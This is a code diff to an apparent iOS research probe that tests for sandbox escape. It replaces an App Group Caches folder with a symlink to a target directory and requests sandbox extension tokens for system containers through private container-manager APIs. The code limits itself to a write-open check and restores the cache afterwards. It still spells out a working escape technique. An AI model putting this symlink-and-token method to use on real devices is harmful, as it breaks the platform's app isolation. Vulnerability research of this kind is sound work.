@@ -62,7 +62,8 @@ static NSDictionary *MCMTryStrategy(NSString *name, uint64_t cls,
                                   NSString *ident, BOOL useGroupIdentifier,
                                   NSString * _Nullable domain,
                                   NSString *expectedDirectory,
-                                  NSString *targetPlist) {
+                                  NSString *targetPlist,
+                                  NSString * _Nullable additionalAcceptableDirectory) {
     NSMutableDictionary *report = [NSMutableDictionary dictionaryWithDictionary:@{
         @"name": name, @"querySucceeded": @NO, @"tokenIssued": @NO,
         @"tokenConsumed": @NO, @"writeOpenAfterToken": @NO,
@@ -128,7 +129,8 @@ static NSDictionary *MCMTryStrategy(NSString *name, uint64_t cls,
         report[@"querySucceeded"] = @YES;
         const char *untrustedPath = getPath(result);
         NSString *normalized = MCMCanonicalPath(untrustedPath ? [NSString stringWithUTF8String:untrustedPath] : nil);
-        BOOL exactPath = [normalized isEqualToString:expectedDirectory];
+        BOOL exactPath = [normalized isEqualToString:expectedDirectory] ||
+            (additionalAcceptableDirectory && [normalized isEqualToString:additionalAcceptableDirectory]);
         report[@"resolvedTargetMatches"] = @(exactPath);
         if (!exactPath) {
             report[@"status"] = @"queryReturnedUnexpectedPath";
@@ -162,6 +164,135 @@ static NSDictionary *MCMTryStrategy(NSString *name, uint64_t cls,
     if (releaseXPC) releaseXPC(identifier);
     dlclose(lib);
     return report;
+}
+
+
+// Requires a dedicated, correctly signed App Group; never touches another app's caches.
+static NSString *A16DedicatedGroup(void) {
+    const char *securityPath = "/System/Library/Frameworks/Security.framework/Security";
+    void *security = dlopen(securityPath, RTLD_NOW | RTLD_LOCAL);
+    if (!security) return nil;
+    CFTypeRef (*createSelf)(CFAllocatorRef) = dlsym(security, "SecTaskCreateFromSelf");
+    CFTypeRef (*copyEntitlement)(CFTypeRef, CFStringRef, CFErrorRef *) =
+        dlsym(security, "SecTaskCopyValueForEntitlement");
+    if (!createSelf || !copyEntitlement) {
+        dlclose(security);
+        return nil;
+    }
+    CFTypeRef task = createSelf(kCFAllocatorDefault);
+    if (!task) { dlclose(security); return nil; }
+    CFTypeRef groups = copyEntitlement(task, CFSTR("com.apple.security.application-groups"), NULL);
+    CFRelease(task);
+    NSString *found = nil;
+    if (groups && CFGetTypeID(groups) == CFArrayGetTypeID()) {
+        for (id group in (__bridge NSArray *)groups) {
+            if ([group isKindOfClass:NSString.class] &&
+                [group isEqualToString:@"group.org.a16probe.research"]) {
+                found = @"group.org.a16probe.research";
+                break;
+            }
+        }
+    }
+    if (groups) CFRelease(groups);
+    dlclose(security);
+    return found;
+}
+
+static NSDictionary *MCMRunDedicatedGroupTrial(NSString *targetDirectory, NSString *targetPlist) {
+    NSMutableDictionary *summary = [@{
+        @"name": @"class7-dedicated-appgroup-symlink",
+        @"status": @"notAttempted",
+        @"entitlementRequired": @"group.org.a16probe.research",
+        @"querySucceeded": @NO, @"tokenIssued": @NO,
+        @"tokenConsumed": @NO, @"verifiedEscape": @NO,
+        @"systemFilesModified": @NO
+    } mutableCopy];
+    NSString *group = A16DedicatedGroup();
+    if (!group) {
+        summary[@"status"] = @"missingDedicatedAppGroupEntitlement";
+        summary[@"interpretation"] = @"The signed running app lacks the dedicated group; no test of class 7 occurred.";
+        return summary;
+    }
+    NSURL *groupURL = [NSFileManager.defaultManager containerURLForSecurityApplicationGroupIdentifier:group];
+    if (!groupURL) {
+        summary[@"status"] = @"dedicatedAppGroupContainerUnavailable";
+        return summary;
+    }
+    NSFileManager *fm = NSFileManager.defaultManager;
+    NSURL *library = [groupURL URLByAppendingPathComponent:@"Library" isDirectory:YES];
+    NSURL *caches = [library URLByAppendingPathComponent:@"Caches" isDirectory:YES];
+    NSURL *backup = [library URLByAppendingPathComponent:@".A16ProbeCachesRecovery" isDirectory:YES];
+    NSError *error = nil;
+    if (![fm createDirectoryAtURL:library withIntermediateDirectories:YES attributes:nil error:&error]) {
+        summary[@"status"] = @"groupLibraryCreationFailed";
+        summary[@"error"] = error.localizedDescription ?: @"unknown";
+        return summary;
+    }
+    // Crash recovery. An existing backup is never overwritten.
+    BOOL backupExists = [fm fileExistsAtPath:backup.path];
+    if (backupExists) {
+        NSDictionary *attrs = [fm attributesOfItemAtPath:caches.path error:nil];
+        BOOL cachesPresent = [fm fileExistsAtPath:caches.path];
+        if (cachesPresent) {
+            summary[@"status"] = @"recoveryConflictNeedsManualReview";
+            return summary;
+        }
+        if (![fm moveItemAtURL:backup toURL:caches error:&error]) {
+            summary[@"status"] = @"recoveryFailed";
+            summary[@"error"] = error.localizedDescription ?: @"unknown";
+            return summary;
+        }
+        summary[@"previousCacheRecovered"] = @YES;
+    }
+    BOOL originalExists = [fm fileExistsAtPath:caches.path];
+    // Never follow or replace an existing symlink from earlier, untrusted state.
+    NSDictionary *originalInfo = [fm attributesOfItemAtPath:caches.path error:nil];
+    if ([originalInfo[NSFileType] isEqual:NSFileTypeSymbolicLink]) {
+        summary[@"status"] = @"unexpectedExistingSymlink";
+        return summary;
+    }
+    BOOL backupMoved = NO;
+    BOOL symlinkCreated = NO;
+    @try {
+        if (originalExists) {
+            if (![fm moveItemAtURL:caches toURL:backup error:&error]) {
+                summary[@"status"] = @"cacheBackupFailed";
+                summary[@"error"] = error.localizedDescription ?: @"unknown";
+                return summary;
+            }
+            backupMoved = YES;
+        }
+        if (![fm createSymbolicLinkAtURL:caches
+                      withDestinationURL:[NSURL fileURLWithPath:targetDirectory]
+                                   error:&error]) {
+            summary[@"status"] = @"symlinkCreationFailed";
+            summary[@"error"] = error.localizedDescription ?: @"unknown";
+            return summary;
+        }
+        symlinkCreated = YES;
+        NSDictionary *trial = MCMTryStrategy(@"class7-dedicated-appgroup-symlink", 7, group, YES,
+            nil, targetDirectory, targetPlist, caches.path);
+        [summary addEntriesFromDictionary:trial];
+    } @finally {
+        BOOL cleanupGood = YES;
+        if (symlinkCreated) {
+            NSError *removeErr = nil;
+            NSDictionary *linkInfo = [fm attributesOfItemAtPath:caches.path error:nil];
+            if ([linkInfo[NSFileType] isEqual:NSFileTypeSymbolicLink]) {
+                if (![fm removeItemAtURL:caches error:&removeErr]) cleanupGood = NO;
+            } else {
+                cleanupGood = NO; // Never remove a directory that another process created.
+            }
+        }
+        if (backupMoved) {
+            NSError *restoreErr = nil;
+            if (![fm fileExistsAtPath:caches.path]) {
+                if (![fm moveItemAtURL:backup toURL:caches error:&restoreErr]) cleanupGood = NO;
+            } else cleanupGood = NO;
+        }
+        summary[@"appGroupCacheRestored"] = @(cleanupGood);
+    }
+    return summary;
 }
 
 @implementation ContainerProbe
@@ -232,16 +363,18 @@ static NSDictionary *MCMTryStrategy(NSString *name, uint64_t cls,
     // Both requests are independent of App Group entitlement, unlike class-7 part symlinks.
     // Private ABI may change in future betas. Run only by explicit user action.
     NSDictionary *geod = MCMTryStrategy(@"class12-geod-partDomain", 12,
-        @"com.apple.geod", NO, geodDomain, root, plist);
+        @"com.apple.geod", NO, geodDomain, root, plist, nil);
     NSDictionary *direct = MCMTryStrategy(@"class13-mobilegestalt-direct", 13,
-        @"systemgroup.com.apple.mobilegestaltcache", YES, nil, root, plist);
-    BOOL success = [geod[@"verifiedEscape"] boolValue] || [direct[@"verifiedEscape"] boolValue];
+        @"systemgroup.com.apple.mobilegestaltcache", YES, nil, root, plist, nil);
+    NSDictionary *class7 = MCMRunDedicatedGroupTrial(root, plist);
+    BOOL success = [geod[@"verifiedEscape"] boolValue] ||
+        [direct[@"verifiedEscape"] boolValue] || ([class7[@"verifiedEscape"] boolValue] && [class7[@"appGroupCacheRestored"] boolValue]);
     return @{
         @"status": success ? @"sandboxEscapeVerified" : @"noSandboxEscapeVerified",
-        @"strategies": @[geod, direct],
+        @"strategies": @[geod, direct, class7],
         @"testedBuild": ReadSystemString("kern.osversion"),
         @"systemFilesModified": @NO,
-        @"interpretation": @"Only denied->allowed->denied O_WRONLY open after a consumed sandbox extension qualifies as verified. No write call is ever made. Runtime crash is possible if Apple's private ABI changed."
+        @"interpretation": @"Only denied->allowed->denied O_WRONLY open after a consumed sandbox extension qualifies as verified. Dedicated App Group cache restoration must also succeed. No system write is attempted. Runtime crash is possible if Apple changes private ABI."
     };
 }
 
